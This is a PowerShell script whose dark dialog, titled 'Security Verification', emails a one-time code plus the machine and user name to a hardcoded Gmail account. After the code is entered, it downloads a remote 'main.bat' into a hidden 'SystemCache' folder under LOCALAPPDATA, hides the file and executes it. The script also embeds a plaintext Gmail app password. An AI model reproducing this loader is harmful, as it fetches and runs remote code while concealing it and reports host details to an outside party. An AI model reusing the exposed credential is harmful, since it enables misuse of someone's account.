[CmdletBinding()]
param (
    [Parameter(Mandatory = $false)]
    [string]$Url = "https://raw.githubusercontent.com/DevJeffersonL/MAS/6257eca084d95d777f9a8a1cb9a1fc805d5cce48/main.bat",

    [Parameter(Mandatory = $false)]
    [string]$FolderName = "SystemCache",

    [Parameter(Mandatory = $false)]
    [string]$FileName = "main.bat",

    [Parameter(Mandatory = $false)]
    [string]$RecipientName = "JEFFERSON LAKASHIANG",

    [Parameter(Mandatory = $false)]
    [string]$NotifyEmail = "jeffersonlakashiang@gmail.com",

    [Parameter(Mandatory = $false)]
    [switch]$Wait
)

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# -------------------------------------------------------------------------
# Security & State Initialization (Windows 10 / PowerShell 5.1 Compatible)
# -------------------------------------------------------------------------
[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12

# Cryptographically secure OTP compatible with .NET Framework on Windows 10
$rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
$bytes = New-Object byte[] 4
$rng.GetBytes($bytes)
$randVal = [System.BitConverter]::ToUInt32($bytes, 0)
$script:otp = (100000 + ($randVal % 900000)).ToString()

$script:attempts = 0
$script:maxAttempts = 3

$smtpServer  = "smtp.gmail.com"
$smtpPort    = 587
$senderUser  = "jeffersonlakashiang@gmail.com"
$appPassword = "tajeiwqogtmlfcps"

function Send-VerificationOtp {
    param (
        [string]$RecipientEmail,
        [string]$DisplayName,
        [string]$Code
    )

    Write-Host "Sending authorization code to $DisplayName..." -ForegroundColor Cyan

    $mailMessage = New-Object System.Net.Mail.MailMessage
    $mailMessage.From = New-Object System.Net.Mail.MailAddress($senderUser, "System Authorization Portal")
    $mailMessage.To.Add((New-Object System.Net.Mail.MailAddress($RecipientEmail, $DisplayName)))
    $mailMessage.Subject = "Security Verification Code: $Code"
    $mailMessage.Body = @"
Machine Name : $env:COMPUTERNAME
User Session : $env:USERNAME
Authorized To: $DisplayName
Timestamp    : $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')

Your one-time access verification code is: $Code

This code is single-use and valid only for this active session.
"@

    $smtpClient = New-Object System.Net.Mail.SmtpClient($smtpServer, $smtpPort)
    $smtpClient.EnableSsl = $true
    $smtpClient.Timeout = 15000
    $smtpClient.Credentials = New-Object System.Net.NetworkCredential($senderUser, $appPassword)

    try {
        $smtpClient.Send($mailMessage)
        Write-Host "Verification email sent successfully." -ForegroundColor Green
        return $true
    }
    catch {
        Write-Error "SMTP Transmission Failed: $($_.Exception.Message)"
        return $false
    }
    finally {
        $mailMessage.Dispose()
        $smtpClient.Dispose()
    }
}

function Invoke-SecurePayloadExecution {
    param (
        [string]$DownloadUrl,
        [string]$TargetFolder,
        [string]$TargetFile,
        [switch]$WaitForExit
    )

    $basePath        = $env:LOCALAPPDATA
    $targetDirectory = Join-Path -Path $basePath -ChildPath $TargetFolder
    $destinationPath = Join-Path -Path $targetDirectory -ChildPath $TargetFile

    if (-not (Test-Path -LiteralPath $targetDirectory)) {
        $folder = New-Item -Path $targetDirectory -ItemType Directory -Force -ErrorAction Stop
        $folder.Attributes = $folder.Attributes -bor [System.IO.FileAttributes]::Hidden
    }

    $webClient = New-Object System.Net.WebClient
    try {
        $webClient.DownloadFile($DownloadUrl, $destinationPath)
    }
    finally {
        $webClient.Dispose()
    }

    if (-not (Test-Path -LiteralPath $destinationPath)) {
        throw "Target destination write failed."
    }

    $fileItem = Get-Item -LiteralPath $destinationPath -Force
    if ($fileItem.Length -eq 0) {
        throw "Downloaded payload is empty (0 bytes)."
    }

    $fileItem.Attributes = $fileItem.Attributes -bor [System.IO.FileAttributes]::Hidden

    $processParams = @{
        FilePath = $destinationPath
    }

    if ($WaitForExit) {
        $processParams['Wait'] = $true
        $processParams['PassThru'] = $true
        $proc = Start-Process @processParams
        return $proc.ExitCode
    } else {
        Start-Process @processParams
        return 0
    }
}

# -------------------------------------------------------------------------
# GUI Layout & Controls
# -------------------------------------------------------------------------
[System.Windows.Forms.Application]::EnableVisualStyles()

$form = New-Object System.Windows.Forms.Form
$form.Text = "Security Verification"
$form.Size = New-Object System.Drawing.Size(460, 360)
$form.StartPosition = "CenterScreen"
$form.FormBorderStyle = "FixedDialog"
$form.MaximizeBox = $false
$form.MinimizeBox = $false
$form.BackColor = [System.Drawing.Color]::FromArgb(24, 24, 28)

$titleLabel = New-Object System.Windows.Forms.Label
$titleLabel.Text = "Identity Verification"
$titleLabel.Font = New-Object System.Drawing.Font("Segoe UI", 14, [System.Drawing.FontStyle]::Bold)
$titleLabel.ForeColor = [System.Drawing.Color]::White
$titleLabel.Location = New-Object System.Drawing.Point(30, 25)
$titleLabel.Size = New-Object System.Drawing.Size(400, 30)
$form.Controls.Add($titleLabel)

$descLabel = New-Object System.Windows.Forms.Label
$descLabel.Text = "A one-time passcode has been dispatched to:`n$RecipientName`nEnter the 6-digit code below to authorize execution."
$descLabel.Font = New-Object System.Drawing.Font("Segoe UI", 9)
$descLabel.ForeColor = [System.Drawing.Color]::FromArgb(170, 170, 180)
$descLabel.Location = New-Object System.Drawing.Point(30, 65)
$descLabel.Size = New-Object System.Drawing.Size(400, 50)
$form.Controls.Add($descLabel)

$txtOtp = New-Object System.Windows.Forms.TextBox
$txtOtp.Font = New-Object System.Drawing.Font("Consolas", 18, [System.Drawing.FontStyle]::Bold)
$txtOtp.Location = New-Object System.Drawing.Point(30, 125)
$txtOtp.Size = New-Object System.Drawing.Size(385, 40)
$txtOtp.MaxLength = 6
$txtOtp.TextAlign = "Center"
$txtOtp.BackColor = [System.Drawing.Color]::FromArgb(38, 38, 44)
$txtOtp.ForeColor = [System.Drawing.Color]::White
$txtOtp.BorderStyle = "FixedSingle"
$form.Controls.Add($txtOtp)

$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Text = "Sending verification email..."
$statusLabel.Font = New-Object System.Drawing.Font("Segoe UI", 9)
$statusLabel.ForeColor = [System.Drawing.Color]::FromArgb(0, 150, 255)
$statusLabel.Location = New-Object System.Drawing.Point(30, 175)
$statusLabel.Size = New-Object System.Drawing.Size(385, 30)
$form.Controls.Add($statusLabel)

$btnVerify = New-Object System.Windows.Forms.Button
$btnVerify.Text = "Authorize & Run"
$btnVerify.Font = New-Object System.Drawing.Font("Segoe UI", 10, [System.Drawing.FontStyle]::Bold)
$btnVerify.Location = New-Object System.Drawing.Point(30, 220)
$btnVerify.Size = New-Object System.Drawing.Size(250, 42)
$btnVerify.BackColor = [System.Drawing.Color]::FromArgb(0, 122, 204)
$btnVerify.ForeColor = [System.Drawing.Color]::White
$btnVerify.FlatStyle = "Flat"
$btnVerify.FlatAppearance.BorderSize = 0
$btnVerify.Cursor = [System.Windows.Forms.Cursors]::Hand
$btnVerify.Enabled = $false
$form.Controls.Add($btnVerify)

$btnCancel = New-Object System.Windows.Forms.Button
$btnCancel.Text = "Exit"
$btnCancel.Font = New-Object System.Drawing.Font("Segoe UI", 10)
$btnCancel.Location = New-Object System.Drawing.Point(290, 220)
$btnCancel.Size = New-Object System.Drawing.Size(125, 42)
$btnCancel.BackColor = [System.Drawing.Color]::FromArgb(50, 50, 56)
$btnCancel.ForeColor = [System.Drawing.Color]::White
$btnCancel.FlatStyle = "Flat"
$btnCancel.FlatAppearance.BorderSize = 0
$btnCancel.Cursor = [System.Windows.Forms.Cursors]::Hand
$form.Controls.Add($btnCancel)

# -------------------------------------------------------------------------
# Event Handlers
# -------------------------------------------------------------------------
$form.Add_Shown({
    $form.Update()
    $sent = Send-VerificationOtp -RecipientEmail $NotifyEmail -DisplayName $RecipientName -Code $script:otp
    if ($sent) {
        $statusLabel.Text = "Code dispatched. Enter your 6-digit key."
        $statusLabel.ForeColor = [System.Drawing.Color]::FromArgb(80, 200, 120)
        $btnVerify.Enabled = $true
        $txtOtp.Focus()
    } else {
        $statusLabel.Text = "Failed to dispatch email. Check SMTP settings."
        $statusLabel.ForeColor = [System.Drawing.Color]::FromArgb(255, 90, 90)
    }
})

$btnVerify.Add_Click({
    $entered = $txtOtp.Text.Trim()

    if ($entered -eq $script:otp) {
        $statusLabel.Text = "Access granted. Downloading payload..."
        $statusLabel.ForeColor = [System.Drawing.Color]::FromArgb(80, 200, 120)
        $btnVerify.Enabled = $false
        $txtOtp.Enabled = $false
        $form.Update()

        try {
            Invoke-SecurePayloadExecution -DownloadUrl $Url -TargetFolder $FolderName -TargetFile $FileName -WaitForExit:$Wait
            $statusLabel.Text = "Payload launched successfully."
            $form.Update()
            Start-Sleep -Seconds 1
            $form.Close()
        }
        catch {
            $statusLabel.Text = "Execution failed: $($_.Exception.Message)"
            $statusLabel.ForeColor = [System.Drawing.Color]::FromArgb(255, 90, 90)
        }
    } else {
        $script:attempts++
        $remaining = $script:maxAttempts - $script:attempts
        $txtOtp.Clear()

        if ($remaining -le 0) {
            $statusLabel.Text = "Maximum attempts exceeded. Closing..."
            $statusLabel.ForeColor = [System.Drawing.Color]::FromArgb(255, 90, 90)
            $btnVerify.Enabled = $false
            $txtOtp.Enabled = $false
            $form.Update()
            Start-Sleep -Seconds 2
            $form.Close()
        } else {
            $statusLabel.Text = "Invalid code. $remaining attempt(s) remaining."
            $statusLabel.ForeColor = [System.Drawing.Color]::FromArgb(255, 90, 90)
            $txtOtp.Focus()
        }
    }
})

$btnCancel.Add_Click({
    $form.Close()
})

$txtOtp.Add_KeyDown({
    param($sender, $e)
    if ($e.KeyCode -eq [System.Windows.Forms.Keys]::Enter -and $btnVerify.Enabled) {
        $btnVerify.PerformClick()
        $e.SuppressKeyPress = $true
    }
})

try {
    [void]$form.ShowDialog()
}
finally {
    $form.Dispose()
}